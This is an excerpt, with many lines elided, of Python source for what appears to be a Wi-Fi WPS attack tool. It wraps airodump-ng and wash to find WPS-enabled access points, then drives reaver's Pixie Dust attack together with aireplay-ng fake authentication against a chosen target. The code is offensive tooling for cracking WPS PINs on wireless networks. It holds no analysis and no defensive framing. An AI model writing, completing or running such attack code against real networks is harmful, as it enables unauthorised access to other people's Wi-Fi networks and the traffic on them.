...
class wpsObj(object):
    ...
    def showLogo(self):
        ...
        print(pixiewpsLogo)
        startupInfo = returnGreenDeep(self.colors,"Developed by ANJEESHNU, Using Reaver & Pixiewps. 2021-2021.")
    ...
    def getWpsTargets(self):
        ...
        sysWrite("\n")
        runAirodump = ("/usr/bin/env bash -c 'nohup ~/.godseye/air/*/src/airodump-ng -a --wps -w {}"
                       " --output-format csv -I 3 -t WPA -t WPA2 -t WPA1"
                       " --ignore-negative-one {} &>/dev/null &'".format(
                        self.wpsFilePath,
                        self.wpsCardName))
        runWash = ("~/.godseye/wps/*/src/wash -i {} -F | tee -a {}".format(
            self.wpsCardName,
            self.tempFilePath))
    ...
    def pixieDust(self):
        ...
        try:
            ...
            if choosenReaverMethod == 1:
                bashRun("~/.godseye/wps/*/src/reaver"
                ...
                bashRun("xterm -title 'ASSOCIATING WITH AP'"
                        ...
                        " -e '~/.godseye/air/*/src/aireplay-ng"
                        " -1 30 -a {0} {1}' & ~/.godseye/wps/*/src/reaver"
